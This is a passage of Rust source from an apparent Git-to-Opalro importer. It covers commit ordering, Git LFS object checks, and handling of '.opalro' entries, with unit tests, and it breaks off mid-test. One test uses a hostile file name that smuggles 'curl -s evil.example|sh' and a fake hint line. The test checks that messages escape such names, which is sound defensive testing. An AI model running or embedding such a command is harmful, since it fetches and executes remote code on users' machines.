struct FirstPass<'g> {
    git: &'g git::Repo,
    progress: &'g mut dyn FnMut(ImportPass, u64, Option<u64>),
    /// Commits read so far.
    read: u64,
    most_extra: u64,
    /// Each commit met, by its index.
    ids: Vec<GitId>,
    by_id: HashMap<GitId, u32>,
    /// Whether each commit, by its index, has been gone into.
    entered: Vec<bool>,
    /// Each commit on the way down, with where its parents start in `todo`.
    stack: Vec<(u32, usize)>,
    /// The parents still to go into of the commits on the stack, each commit's smallest ID last.
    todo: Vec<u32>,
    /// Parents met beyond each commit's first.
    extra: u64,
    /// The change IDs commits' `change-id` headers give.
    headers: HashSet<ChangeId>,
}

impl FirstPass<'_> {
    /// The index of the commit `id`, which it gets when first met.
    fn index_of(&mut self, id: GitId) -> Result<u32, ImportError> {
        if let Some(&index) = self.by_id.get(&id) {
            return Ok(index);
        }
        let index = u32::try_from(self.ids.len()).map_err(|_| ImportError::Stop {
            what: "This Git history has more commits than Opalro can count in one import."
                .to_owned(),
            hint: None,
        })?;
        self.ids.push(id);
        self.entered.push(false);
        self.by_id.insert(id, index);
        Ok(index)
    }

    fn id(&self, index: u32) -> Result<GitId, ImportError> {
        self.ids.get(index as usize).copied().ok_or_else(|| {
            bug(format!(
                "Opalro lost track of commit {index} of its first pass"
            ))
        })
    }

    /// Goes into the commit `index` unless it was gone into before: reads it, counts its
    /// parents, and puts it on the stack and its parents on `todo`.
    fn enter(&mut self, index: u32) -> Result<(), ImportError> {
        let id = self.id(index)?;
        match self.entered.get_mut(index as usize) {
            Some(entered) if !*entered => *entered = true,
            _ => return Ok(()),
        }
        let commit = outline(self.git, &id)?;
        self.read = self.read.saturating_add(1);
        (self.progress)(ImportPass::ReadingHistory, self.read, None);
        let mut parents = commit.parents;
        self.headers.extend(commit.change_id);
        self.extra = self
            .extra
            .saturating_add((parents.len() as u64).saturating_sub(1));
        if self.extra > self.most_extra {
            return Err(too_many_parents(self.most_extra));
        }
        // Taken from the end, so the smallest ID is gone into first.
        parents.sort_unstable_by(|a, b| b.cmp(a));
        self.stack.push((index, self.todo.len()));
        for parent in parents {
            let parent = self.index_of(parent)?;
            self.todo.push(parent);
        }
        Ok(())
    }
}

/// The stop for a history whose commits have more than `most` parents beyond each one's first.
fn too_many_parents(most: u64) -> ImportError {
    ImportError::Stop {
        what: format!(
            "This Git history's merges have more than {} parents beyond their first, and Opalro \
             takes at most that many in one import, since each save keeps all of its parents. \
             Real histories have far fewer: Linux's has about 80,000 merges.",
            thousands(most)
        ),
        hint: Some(
            "Nothing was changed. If this history is real and you need all of it in Opalro, \
             please report it, with this message."
                .to_owned(),
        ),
    }
}

/// The warning for `count` commits whose `change-id` header gives a change ID another commit has
/// too, so their saves took their own commits' change IDs.
fn duplicate_change_ids(count: u64) -> Warning {
    let message = if count == 1 {
        "A commit has a change-id header (Jujutsu's) giving a change ID another commit in this \
         history has too, so its save took the change ID of its own commit instead, as a commit \
         without that header does. Two saves never share a change ID."
            .to_owned()
    } else {
        format!(
            "{} commits have change-id headers (Jujutsu's) giving change IDs other commits in \
             this history have too, so their saves took the change IDs of their own commits \
             instead, as commits without that header do. Two saves never share a change ID.",
            thousands(count)
        )
    };
    Warning::new(warning::DUPLICATE_CHANGE_ID, message)
}

/// The lines `refs` become: each name with the save of its commit.
fn lines_of(
    converter: &Converter<'_>,
    refs: &[Named],
) -> Result<BTreeMap<String, Id>, ImportError> {
    refs.iter()
        .map(|line| Ok((line.opalro.clone(), converter.save_of(&line.target)?)))
        .collect()
}

/// Stores the record `encoded` of `kind`, a tag list or server lines, unless a good copy is there
/// already. Their encoders don't check what they write, so `read_back` reads it first, as the
/// decoder would, without keeping what it reads, since either can be big. Their sizes were held
/// to a record's limit before anything was written: the tag list's by `roots` (and again, as a
/// guard, by the converter), the server lines' by `Names::of`.
fn put_record(
    store: &Store,
    packs: &mut PackSet,
    kind: ObjectKind,
    encoded: &[u8],
    read_back: impl FnOnce(&[u8]) -> Result<(), DecodeError>,
) -> Result<Id, ImportError> {
    let what = if kind == ObjectKind::TagList {
        "tag list"
    } else {
        "server-lines list"
    };
    read_back(encoded)
        .map_err(|e| bug(format!("Opalro made a {what} it can't read back ({e})")))?;
    let flavor = kind
        .flavor()
        .ok_or_else(|| bug(format!("Opalro took a {what} for content")))?;
    let id = hash_record(flavor, encoded);
    let size = encoded.len() as u64;
    if !packs.contains(&id) && !store.has_good_copy(&id, kind, size)? {
        packs.add_record(kind, encoded)?;
    }
    Ok(id)
}

/// The stop for an entry `name` spelled `.opalro` that Git tracks at the top. The name comes from
/// the repository, so it is only ever shown escaped, never put in a command: one spelling, such
/// as `.opalro:$(…)`, can hold anything but `/`.
fn tracked_stop(name: &str) -> ImportError {
    let hint = if name == ".opalro" {
        "Nothing was changed. Opalro reads the commit Git is on, so the folder has to leave it: \
         rename it with `git mv` and commit, or run `git rm -r --cached .opalro`, commit, and move \
         the folder elsewhere. Then run opalro import again."
    } else {
        "Nothing was changed. Opalro reads the commit Git is on, so the entry named above has to \
         leave it: rename it or remove it in Git and commit, and move it out of this folder if it \
         is still here. Then run opalro import again."
    };
    ImportError::Stop {
        what: format!(
            "Git tracks `{}` at the top of this project, and Opalro can't use it as its own \
             .opalro folder.",
            escape_all(name)
        ),
        hint: Some(hint.to_owned()),
    }
}

/// The name of an entry spelled `.opalro` at the top of the tree of `HEAD`'s commit, of any kind,
/// if Git tracks one: Git checks it out where Opalro keeps the project, and Opalro never takes files
/// Git wrote for its own.
fn tracked_opal(git: &git::Repo, head: &GitId) -> Result<Option<String>, ImportError> {
    let tree = outline(git, head)?.tree;
    let place = || format!("the top folder (tree `{}`) of `HEAD`", tree.to_hex());
    let object = git.read(&tree).map_err(|e| at(e, place))?;
    expect_kind(object.kind, ObjectType::Tree, &tree, place)?;
    let entries = parse_tree(&object.data, git.hash()).map_err(|e| at(e, place))?;
    Ok(entries.into_iter().find_map(|e| {
        let name = std::str::from_utf8(e.name).ok()?;
        (validate_name(name) == Err(NameError::OpalSpelling)).then(|| name.to_owned())
    }))
}

/// Most bytes of the top `.gitattributes` read to look for Git LFS's filter; a bigger one counts
/// as a sign of it.
const MAX_ATTRIBUTES_BYTES: u64 = 1 << 20;

/// How many Git LFS files whose objects are missing an import's stop lists.
const MAX_MISSING_LISTED: usize = 20;

/// Checks, before anything is written, that every Git LFS file of the commits `order` has its
/// object in `.git/lfs/objects`, when the repository shows a sign of Git LFS: a `.git/lfs`
/// folder, or `filter=lfs` in the top `.gitattributes` of `HEAD`'s commit `head`.
/// Without one, the converter stops at the first missing object it meets. Each pointer goes
/// through the `LfsRules` the converter follows, from `setting`, so what stops one stops the
/// other. Each commit's walk counts only trees not walked before, against fresh `limits`, so it
/// may let through a commit the converter will refuse; past them it stops looking. `progress`
/// hears how many commits it has looked at.
fn check_lfs_objects(
    git: &git::Repo,
    head: &GitId,
    order: &[GitId],
    setting: Option<&LfsElsewhere>,
    limits: &dyn Fn() -> SaveLimits,
    progress: &mut dyn FnMut(ImportPass, u64, Option<u64>),
) -> Result<(), ImportError> {
    let tree = outline(git, head)?.tree;
    if !git.has_lfs_folder()? && !lfs_attribute(git, &tree)? {
        return Ok(());
    }
    // Its sets go when it returns, before the converter makes its own.
    let mut check = LfsCheck {
        git,
        rules: LfsRules::new(git, setting.cloned()),
        trees: HashSet::new(),
        blobs: HashSet::new(),
        objects: HashSet::new(),
        first: Vec::new(),
        count: 0,
        bytes: 0,
    };
    let total = order.len() as u64;
    for (done, commit) in (1..).zip(order) {
        if !check.commit(commit, limits())? {
            break;
        }
        progress(ImportPass::CheckingLfs, done, Some(total));
    }
    if check.count == 0 {
        return Ok(());
    }
    Err(check.rules.missing(check.first, check.count, check.bytes))
}

/// The first pass's look for Git LFS files whose objects are missing. Each folder and each file
/// is looked at once, and each object looked for once, whichever commits hold them.
struct LfsCheck<'g> {
    git: &'g git::Repo,
    rules: LfsRules<'g>,
    trees: HashSet<GitId>,
    /// Files looked at already, whatever their size.
    blobs: HashSet<GitId>,
    /// Objects looked for, by oid and size.
    objects: HashSet<([u8; 32], u64)>,
    /// The first missing, as the commit (hex), the path and the size, and how many in all, with
    /// their total size; pointers are untrusted, so it saturates.
    first: Vec<(String, String, u64)>,
    count: u64,
    bytes: u64,
}

impl LfsCheck<'_> {
    /// Looks at the folders and files of the commit `commit` not looked at before; `false` once
    /// past `limits`.
    fn commit(&mut self, commit: &GitId, mut limits: SaveLimits) -> Result<bool, ImportError> {
        let tree = outline(self.git, commit)?.tree;
        if !self.trees.insert(tree) {
            return Ok(true);
        }
        let hex = commit.to_hex();
        let top = kept_entries(self.git, &tree)?;
        if limits.add(top.len()).is_err() {
            return Ok(false);
        }
        // Each folder on the way down, by name and with how long its path is with a `/` after
        // it, and the entries in it still to look at.
        let mut stack = vec![(String::new(), 0usize, top.into_iter())];
        while let Some((_, prefix, left)) = stack.last_mut() {
            let prefix = *prefix;
            let Some((name, kind, id)) = left.next() else {
                stack.pop();
                continue;
            };
            let path_len = prefix.saturating_add(name.len());
            if limits.check_path(path_len).is_err() {
                return Ok(false);
            }
            match kind {
                EntryKind::Folder if self.trees.insert(id) => {
                    // The new folder's level: the top folder is level 0.
                    if limits.check_depth(stack.len()).is_err() {
                        return Ok(false);
                    }
                    let inner = kept_entries(self.git, &id)?;
                    if limits.add(inner.len()).is_err() {
                        return Ok(false);
                    }
                    stack.push((name, path_len.saturating_add(1), inner.into_iter()));
                }
                kind if may_be_lfs(kind) && self.blobs.insert(id) => {
                    let path = || {
                        let folders = stack.iter().skip(1).map(|(n, ..)| n.as_str());
                        let mut path: Vec<&str> = folders.collect();
                        path.push(&name);
                        shown_path(&path)
                    };
                    self.file(&id, &hex, &path)?;
                }
                _ => {}
            }
        }
        Ok(true)
    }

    /// Reads the file `id`, at `path` in the commit `commit` (hex), if it is small enough to be a
    /// pointer, and notes the object it points to if that is missing.
    fn file(
        &mut self,
        id: &GitId,
        commit: &str,
        path: &dyn Fn() -> String,
    ) -> Result<(), ImportError> {
        let place = || format!("the file `{}` of commit `{commit}`", path());
        let (_, size) = self.git.header(id).map_err(|e| at(e, place))?;
        if size > MAX_LFS_POINTER_BYTES as u64 {
            return Ok(());
        }
        let object = self.git.read(id).map_err(|e| at(e, place))?;
        expect_kind(object.kind, ObjectType::Blob, id, place)?;
        let Some(p) = lfs_pointer(&object.data) else {
            return Ok(());
        };
        if !self.rules.needs_object(&p, commit, path)?
            || !self.objects.insert((p.oid, p.size))
            || self.git.lfs_object(&p)?.is_some()
        {
            return Ok(());
        }
        self.count = self.count.saturating_add(1);
        self.bytes = self.bytes.saturating_add(p.size);
        if self.first.len() < MAX_MISSING_LISTED {
            self.first.push((commit.to_owned(), path(), p.size));
        }
        Ok(())
    }
}

/// Whether a line of the top `.gitattributes` in the tree `tree` that isn't a comment names Git
/// LFS's filter, or the file is too big to tell.
fn lfs_attribute(git: &git::Repo, tree: &GitId) -> Result<bool, ImportError> {
    let place = || "the top `.gitattributes` of `HEAD`".to_owned();
    let entries = kept_entries(git, tree)?;
    let file = |kind| matches!(kind, EntryKind::File | EntryKind::Executable);
    let Some((_, _, id)) = entries
        .into_iter()
        .find(|(name, kind, _)| name == ".gitattributes" && file(*kind))
    else {
        return Ok(false);
    };
    let (_, size) = git.header(&id).map_err(|e| at(e, place))?;
    if size > MAX_ATTRIBUTES_BYTES {
        return Ok(true);
    }
    let object = git.read(&id).map_err(|e| at(e, place))?;
    expect_kind(object.kind, ObjectType::Blob, &id, place)?;
    // Git skips the blanks a line starts with, then a line starting with `#` is a comment.
    let lines = object
        .data
        .split(|&b| b == b'\n')
        .map(<[u8]>::trim_ascii_start);
    Ok(lines
        .filter(|line| !line.starts_with(b"#"))
        .any(|line| line.windows(10).any(|w| w == b"filter=lfs")))
}

/// The entries of the Git tree `id` that saves keep, as the converter judges their names.
fn kept_entries(
    git: &git::Repo,
    id: &GitId,
) -> Result<Vec<(String, EntryKind, GitId)>, ImportError> {
    let place = || format!("tree `{}`", id.to_hex());
    let object = git.read(id).map_err(|e| at(e, place))?;
    expect_kind(object.kind, ObjectType::Tree, id, place)?;
    let entries = parse_tree(&object.data, git.hash()).map_err(|e| at(e, place))?;
    Ok(entries
        .into_iter()
        .filter_map(|e| {
            let name = std::str::from_utf8(e.name).ok()?;
            let kept = validate_name(name).is_ok() && !is_git_alias(name);
            kept.then(|| (name.to_owned(), e.kind, e.id))
        })
        .collect())
}

/// A warning for each folder named `.opalro` that Git checked out below the top, from the tree of
/// `HEAD`'s commit: Opalro left them out of history, but commands run inside one would take it for
/// a project (decision 019). `tracked_opal` found none at the top.
fn opal_folder_warnings(git: &git::Repo, head: &GitId) -> Result<Vec<Warning>, ImportError> {
    let tree = outline(git, head)?.tree;
    let mut warnings = Vec::new();
    let mut count = 0u64;
    // Each tree is looked at once, so a folder Git holds at two paths is named at the first.
    let mut seen = HashSet::from([tree]);
    // Each folder on the way down, by name, with the folders in it still to look at.
    let mut stack = vec![(String::new(), subfolders(git, &tree)?.into_iter())];
    while let Some((_, left)) = stack.last_mut() {
        let Some((name, id, is_opal)) = left.next() else {
            stack.pop();
            continue;
        };
        if is_opal {
            count = count.saturating_add(1);
            if warnings.len() < MAX_LISTED {
                let mut path: Vec<&str> = stack.iter().skip(1).map(|(n, _)| n.as_str()).collect();
                path.push(&name);
                let message = format!(
                    "Git checked out a folder named .opalro at `{}`. Opalro left it out of history, \
                     but commands run inside it would use it as an Opalro project; delete it unless \
                     you made it.",
                    escape_all(&shown_path(&path))
                );
                warnings.push(Warning::new(warning::NESTED_OPALRO_FOLDER, message));
            }
        } else if seen.insert(id) {
            let inner = subfolders(git, &id)?.into_iter();
            stack.push((name, inner));
        }
    }
    let more = count.saturating_sub(warnings.len() as u64);
    if more > 0 {
        let message = if more == 1 {
            "Git checked out 1 more folder named .opalro. Opalro left it out of history too; delete \
             it unless you made it."
                .to_owned()
        } else {
            format!(
                "Git checked out {} more folders named .opalro. Opalro left them out of history too; \
                 delete them unless you made them.",
                thousands(more)
            )
        };
        warnings.push(Warning::new(warning::NESTED_OPALRO_FOLDER, message));
    }
    Ok(warnings)
}

/// The folders in the Git tree `id` that saves keep, and those spelled `.opalro`, which they leave
/// out (`true`), as the converter judges their names.
fn subfolders(git: &git::Repo, id: &GitId) -> Result<Vec<(String, GitId, bool)>, ImportError> {
    let place = || format!("tree `{}`", id.to_hex());
    let object = git.read(id).map_err(|e| at(e, place))?;
    expect_kind(object.kind, ObjectType::Tree, id, place)?;
    let entries = parse_tree(&object.data, git.hash()).map_err(|e| at(e, place))?;
    Ok(entries
        .into_iter()
        .filter(|e| e.kind == EntryKind::Folder)
        .filter_map(|e| {
            let name = std::str::from_utf8(e.name).ok()?;
            match validate_name(name) {
                Err(NameError::OpalSpelling) => Some((name.to_owned(), e.id, true)),
                Ok(()) if !is_git_alias(name) => Some((name.to_owned(), e.id, false)),
                _ => None,
            }
        })
        .collect())
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
    #![allow(clippy::indexing_slicing, clippy::arithmetic_side_effects)]
    use super::*;
    use crate::git::craft::{Craft, PackEntry};
    use crate::git::{GitId, HashKind, ObjectType, object_id};
    use crate::save::Person;

    fn who() -> Person {
        Person {
            name: "Ada".into(),
            email: "ada@example.com".into(),
            time_ms: 0,
            tz_offset_min: 0,
        }
    }

    /// A repository of one commit on `main`, as `Craft` writes it, and the commit.
    fn one_commit(dir: &Path) -> (Craft, GitId) {
        let git = Craft::new(dir, HashKind::Sha1);
        let blob = git.object(ObjectType::Blob, b"a\n");
        let tree = git.tree(&[(b"100644", b"a.txt", blob)]);
        let raw = format!(
            "tree {}\nauthor A <a@example.com> 0 +0000\ncommitter A <a@example.com> 0 +0000\n\n\
             One\n",
            tree.to_hex()
        );
        let commit = git.commit(raw.as_bytes());
        git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
        (git, commit)
    }

    /// A tag object of `target`, a `kind`, with `message`.
    fn tag_object(git: &Craft, target: &GitId, kind: &str, message: &[u8]) -> GitId {
        let head = format!(
            "object {}\ntype {kind}\ntag t\ntagger T <t@example.com> 0 +0000\n\n",
            target.to_hex()
        );
        git.object(ObjectType::Tag, &[head.as_bytes(), message].concat())
    }

    fn import(dir: &Path) -> Result<ImportReport, ImportError> {
        import_git(
            dir,
            &mut ImportRequest {
                who: &who(),
                command: "import",
                git_settings: None,
                progress: &mut |_, _, _| {},
            },
            &mut None,
        )
    }

    #[test]
    fn start_and_import_write_feature_chunks() {
        let started = tempfile::tempdir().unwrap();
        Repository::init(started.path(), &who()).unwrap();
        let imported = tempfile::tempdir().unwrap();
        one_commit(imported.path());
        import(imported.path()).unwrap();
        for dir in [started.path(), imported.path()] {
            let format = std::fs::read_to_string(dir.join(".opalro/format")).unwrap();
            assert_eq!(format, "opal-repository 1\nhash blake3\nfeature chunks\n");
        }
    }

    /// The converter would refuse these tags only after every commit was converted; the first
    /// pass refuses them alike, before `.opalro` is made.
    #[test]
    fn tags_past_opals_limits_stop_the_import_before_anything_is_written() {
        // A chain of `objects` tag objects to `commit`, the one nearest it holding `message`.
        let chain = |git: &Craft, commit: &GitId, objects: usize, message: &[u8]| {
            let mut id = tag_object(git, commit, "commit", message);
            for _ in 1..objects {
                id = tag_object(git, &id, "tag", b"n\n");
            }
            id
        };
        let big = vec![b'x'; crate::diary::MAX_GIT_TAG_OBJECT_BYTES];
        for (refusal, objects, message) in [
            ("more than the 1 MiB Opalro keeps", 1, big.as_slice()),
            ("more than 16 tag objects", 17, b"1\n"),
        ] {
            let dir = tempfile::tempdir().unwrap();
            let (git, commit) = one_commit(dir.path());
            let id = chain(&git, &commit, objects, message);
            git.loose_ref("refs/tags/t", &format!("{}\n", id.to_hex()));
            match import(dir.path()) {
                Err(e @ ImportError::Git(GitError::Unimportable { .. })) => {
                    assert!(e.to_string().contains(refusal), "{e}");
                }
                other => panic!("{refusal}: {:?}", other.map(|_| ())),
            }
            assert!(!dir.path().join(".opalro").exists(), "{refusal}");
        }
        // Sixteen tag objects are as many as Opalro keeps.
        let dir = tempfile::tempdir().unwrap();
        let (git, commit) = one_commit(dir.path());
        let id = chain(&git, &commit, 16, b"1\n");
        git.loose_ref("refs/tags/t", &format!("{}\n", id.to_hex()));
        assert_eq!(import(dir.path()).unwrap().tags, 1);
    }

    /// Any spelling of `.opalro` the converter would leave out, of any kind, as long as Git tracks
    /// it at the top: here nothing is checked out, so only the tree shows it.
    #[test]
    fn a_opal_entry_git_tracks_at_the_top_stops_the_import() {
        // A spelling a system takes for `.opalro` can go on past a `:`, and hold a newline.
        let hostile = ".opalro:$(curl -s evil.example|sh)\nhint: paste me";
        for (name, mode) in [
            (".opalro", "100644"),
            (".Opalro.", "40000"),
            ("OPALRO~1", "120000"),
            (hostile, "100644"),
        ] {
            let dir = tempfile::tempdir().unwrap();
            let git = Craft::new(dir.path(), HashKind::Sha1);
            let blob = git.object(ObjectType::Blob, b"a\n");
            let inner = git.tree(&[(b"100644", b"config.toml", blob)]);
            let id = if mode == "40000" { inner } else { blob };
            let tree = git.tree(&[(mode.as_bytes(), name.as_bytes(), id)]);
            let raw = format!(
                "tree {}\nauthor A <a@example.com> 0 +0000\ncommitter A <a@example.com> 0 \
                 +0000\n\nOne\n",
                tree.to_hex()
            );
            let commit = git.commit(raw.as_bytes());
            git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
            let e = import(dir.path()).unwrap_err();
            assert!(matches!(e, ImportError::Stop { .. }), "{e:?}");
            let (message, hint) = (e.to_string(), e.hint().unwrap());
            let what = format!(
                "Git tracks `{}` at the top of this project",
                escape_all(name)
            );
            assert!(message.starts_with(&what), "{message}");
            assert!(!message.contains('\n'), "{message}");
            // The hint is true (Opalro reads the commit, so the change is committed), and names no
            // command made from the repository's text; only `.opalro` itself gets one.
            assert!(hint.contains("and commit"), "{hint}");
            assert!(!hint.contains("$(") && !hint.contains("paste me"), "{hint}");
            let rm = "`git rm -r --cached .opalro`";
            assert_eq!(hint.contains(rm), name == ".opalro", "{hint}");
            assert!(!dir.path().join(".opalro").exists(), "{name}");
        }
    }

    /// The first pass counts each tag as the converter will keep it, so its count is the size of
    /// the tag list stored, but for the head, which it counts at its largest.
    #[test]
    fn the_first_pass_counts_the_tag_list_as_it_is_stored() {
        let dir = tempfile::tempdir().unwrap();
        let (git, commit) = one_commit(dir.path());
        // Not UTF-8, so it is decoded, and cut to 64 KiB only once it is.
        let long = [b"\xff".repeat(30_000), b"y".repeat(40_000)].concat();
        let annotated = tag_object(&git, &commit, "commit", &long);
        let nested = tag_object(&git, &annotated, "tag", b"Again\n");
        let tree = git.tree(&[]);
        let mut refs = String::new();
        for (name, id) in [
            ("refs/tags/annotated", annotated),
            ("refs/tags/folder", tree),
            ("refs/tags/light", commit),
            ("refs/tags/nested", nested),
            ("refs/tags/same", annotated),
        ] {
            let _ = writeln!(refs, "{} {name}", id.to_hex());
        }
        git.packed_refs(&refs);
        let repo = git::Repo::open(dir.path()).unwrap();
        let refs = repo.refs().unwrap();
        let names = Names::of(&refs).unwrap();
        let mut budget = TagBudget::new();
        roots(&repo, &refs, &names.tags, &mut budget).unwrap();
        drop(repo);
        let report = import(dir.path()).unwrap();
        assert_eq!(report.tags, 4);
        let project = Repository::open(dir.path()).unwrap();
        let state = project.current().unwrap().1.state;
        let list = project
            .store()
            .read_record(&state.tags.unwrap(), ObjectKind::TagList);
        let stored = list.unwrap().len() as u64;
        assert_eq!(
            budget.used() - TagList::head_len(crate::diary::MAX_TAGS),
            stored - TagList::head_len(report.tags)
        );
    }

    /// One tag object just under 1 MiB, which 513 tags name. Each tag keeps the object's bytes, so
    /// together they come to more than the 512 MiB a tag list holds, though the first pass reads
    /// the object only once.
    #[test]
    fn a_tag_list_past_its_limit_stops_the_import_before_anything_is_written() {
        let dir = tempfile::tempdir().unwrap();
        let (git, commit) = one_commit(dir.path());
        let message = vec![b'x'; crate::diary::MAX_GIT_TAG_OBJECT_BYTES - 200];
        let tag = tag_object(&git, &commit, "commit", &message);
        let mut packed = "# pack-refs with: peeled fully-peeled sorted \n".to_owned();
        for n in 0..513 {
            let _ = writeln!(packed, "{} refs/tags/t{n:03}", tag.to_hex());
        }
        git.packed_refs(&packed);
        match import(dir.path()) {
            Err(e @ ImportError::Stop { .. }) => {
                assert!(e.to_string().contains("tag list can't hold"), "{e}");
                assert!(e.hint().unwrap().contains("git tag -d"), "{e:?}");
            }
            other => panic!("{:?}", other.map(|_| ())),
        }
        assert!(!dir.path().join(".opalro").exists());
    }

    /// Stores a commit of `tree` with `parents` and `message` in `git`.
    fn commit_on(git: &Craft, tree: &GitId, parents: &[GitId], message: &str) -> GitId {
        let mut raw = format!("tree {}\n", tree.to_hex());
        for parent in parents {
            let _ = writeln!(raw, "parent {}", parent.to_hex());
        }
        raw += "author A <a@example.com> 0 +0000\ncommitter A <a@example.com> 0 +0000\n\n";
        git.commit((raw + message).as_bytes())
    }

    /// Pass 1 puts each commit after its parents, smallest Git ID first, and stops once the
    /// commits have more parents beyond each one's first than its limit, before anything is
    /// written.
    #[test]
    fn the_first_pass_orders_commits_and_counts_their_extra_parents() {
        let dir = tempfile::tempdir().unwrap();
        let git = Craft::new(dir.path(), HashKind::Sha1);
        let tree = git.tree(&[]);
        let commit = |parents: &[GitId], message: &str| commit_on(&git, &tree, parents, message);
        let (a, b, c) = (commit(&[], "a\n"), commit(&[], "b\n"), commit(&[], "c\n"));
        // Three parents past its first, one of them a parent twice.
        let merge = commit(&[c, a, b, a], "merge\n");
        let tip = commit(&[merge], "tip\n");
        let repo = git::Repo::open(dir.path()).unwrap();
        let roots = BTreeSet::from([tip]);
        let mut want = vec![a, b, c];
        want.sort();
        want.extend([merge, tip]);
        assert_eq!(
            in_order(&repo, &roots, 3, &mut |_, _, _| {}).unwrap().0,
            want
        );
        let e = in_order(&repo, &roots, 2, &mut |_, _, _| {}).unwrap_err();
        assert!(
            e.to_string()
                .contains("more than 2 parents beyond their first"),
            "{e}"
        );
        assert!(
            e.hint().unwrap().starts_with("Nothing was changed."),
            "{e:?}"
        );
    }

    /// The import's fixed order (storage-format.md §5), which decides who keeps a duplicated
    /// change-id header's ID: depth first from the roots, smallest Git ID first, so the first
    /// root's whole history comes before the second's, and a commit both reach comes once.
    #[test]
    fn the_first_pass_walks_its_roots_depth_first_smallest_id_first() {
        let dir = tempfile::tempdir().unwrap();
        let git = Craft::new(dir.path(), HashKind::Sha1);
        let tree = git.tree(&[]);
        let commit = |parents: &[GitId], message: &str| commit_on(&git, &tree, parents, message);
        let shared = commit(&[], "shared\n");
        let (one, two) = (commit(&[shared], "one\n"), commit(&[shared], "two\n"));
        let (tip_one, tip_two) = (commit(&[one], "tip one\n"), commit(&[two], "tip two\n"));
        let repo = git::Repo::open(dir.path()).unwrap();
        let roots = BTreeSet::from([tip_one, tip_two]);
        let (first, second) = if tip_one < tip_two {
            ([one, tip_one], [two, tip_two])
        } else {
            ([two, tip_two], [one, tip_one])
        };
        let want: Vec<GitId> = [shared].into_iter().chain(first).chain(second).collect();
        assert_eq!(
            in_order(&repo, &roots, 0, &mut |_, _, _| {}).unwrap().0,
            want
        );
    }

    /// Opalro doesn't follow a config's includes, so an import of a repository whose config has one
    /// says it can't tell whether they turn on sparse checkout; without one, it says nothing.
    #[test]
    fn config_includes_are_warned_about() {
        let warning = |config: &str| {
            let dir = tempfile::tempdir().unwrap();
            let (git, _) = one_commit(dir.path());
            git.config(config);
            let report = import(dir.path()).unwrap();
            let found = report.warnings.into_iter();
            found
                .filter(|w| w.kind == warning::CONFIG_INCLUDES_IGNORED)
                .map(|w| w.message)
                .next()
        };
        let message = warning("[core]\n\tbare = false\n[include]\n\tpath = sparse.inc\n").unwrap();
        assert!(message.contains("git sparse-checkout disable"), "{message}");
        assert!(warning("[includeIf \"gitdir:/x/\"]\n\tpath = x.inc\n").is_some());
        assert_eq!(warning("[core]\n\tbare = false\n"), None);
    }

    /// No two saves share a change ID: a `change-id` header that another commit's own ID gives
    /// is passed over even when its commit comes first, and a warning counts it.
    #[test]
    fn a_header_never_takes_the_change_id_another_commits_own_id_gives() {
        let dir = tempfile::tempdir().unwrap();
        let (git, first) = one_commit(dir.path());
        let own = ChangeId::from_git_commit(first.as_bytes());
        let letters = own.to_letters();
        let tree = git.tree(&[]);
        // A root on another branch, made to come before `main`'s in the import's order.
        let side = (0..)
            .map(|n| {
                let raw = format!(
                    "tree {}\nauthor A <a@example.com> 0 +0000\ncommitter A <a@example.com> 0 \
                     +0000\nchange-id {letters}\n\nSide {n}\n",
                    tree.to_hex()
                );
                git.commit(raw.as_bytes())
            })
            .find(|side| *side < first)
            .unwrap();
        git.loose_ref("refs/heads/side", &format!("{}\n", side.to_hex()));
        let report = import(dir.path()).unwrap();
        let project = Repository::open(dir.path()).unwrap();
        let lines = project.current().unwrap().1.state.lines;
        let change_id = |line: &str| project.store().save(&lines[line], false).unwrap().change_id;
        assert_eq!(change_id("main"), own);
        assert_eq!(
            change_id("side"),
            ChangeId::from_git_commit(side.as_bytes())
        );
        let warning = report
            .warnings
            .iter()
            .find(|w| w.kind == warning::DUPLICATE_CHANGE_ID);
        let message = &warning.unwrap().message;
        assert!(
            message.starts_with("A commit has a change-id header"),
            "{message}"
        );
    }

    /// Decision 033's limits on lines, read from a real `packed-refs`, stop the import before
    /// anything is written.
    #[test]
    fn more_lines_than_opal_holds_stop_the_import_before_anything_is_written() {
        for (prefix, refusal) in [
            ("refs/heads/b", "more than 100,000 branches"),
            (
                "refs/remotes/origin/b",
                "server `origin` has more than 100,000 branches",
            ),
        ] {
            let dir = tempfile::tempdir().unwrap();
            let (git, commit) = one_commit(dir.path());
            let mut packed = "# pack-refs with: peeled fully-peeled sorted \n".to_owned();
            for n in 0..=100_000 {
                let _ = writeln!(packed, "{} {prefix}{n:06}", commit.to_hex());
            }
            git.packed_refs(&packed);
            match import(dir.path()) {
                Err(ImportError::Git(e @ GitError::TooManyRefs { .. })) => {
                    assert!(e.to_string().contains(refusal), "{e}");
                }
                other => panic!("{refusal}: {:?}", other.map(|_| ())),
            }
            assert!(!dir.path().join(".opalro").exists(), "{refusal}");
        }
    }

    #[test]
    fn opal_folders_past_the_first_100_are_counted() {
        for (folders, last) in [
            (
                101,
                "Git checked out 1 more folder named .opalro. Opalro left it out of history too; \
                 delete it unless you made it.",
            ),
            (
                102,
                "Git checked out 2 more folders named .opalro. Opalro left them out of history \
                 too; delete them unless you made them.",
            ),
        ] {
            let dir = tempfile::tempdir().unwrap();
            let git = Craft::new(dir.path(), HashKind::Sha1);
            let blob = git.object(ObjectType::Blob, b"a\n");
            let opalro = git.tree(&[(b"100644", b"x", blob)]);
            // Each folder's tree its own, since each tree is looked at once.
            let folders: Vec<(Vec<u8>, GitId)> = (0..folders)
                .map(|n| {
                    let own = git.object(ObjectType::Blob, format!("{n}\n").as_bytes());
                    let folder =
                        git.tree(&[(b"40000", b".opalro", opalro), (b"100644", b"n.txt", own)]);
                    (format!("d{n:03}").into_bytes(), folder)
                })
                .collect();
            let entries: Vec<(&[u8], &[u8], GitId)> = folders
                .iter()
                .map(|(name, id)| (&b"40000"[..], name.as_slice(), *id))
                .collect();
            let tree = git.tree(&entries);
            let raw = format!(
                "tree {}\nauthor A <a@example.com> 0 +0000\ncommitter A <a@example.com> 0 \
                 +0000\n\nOne\n",
                tree.to_hex()
            );
            let commit = git.commit(raw.as_bytes());
            let repo = git::Repo::open(dir.path()).unwrap();
            let warnings = opal_folder_warnings(&repo, &commit).unwrap();
            assert_eq!(warnings.len(), 101);
            assert!(
                warnings[0].message.contains("at `d000/.opalro`."),
                "{warnings:?}"
            );
            assert_eq!(warnings[100].message, last);
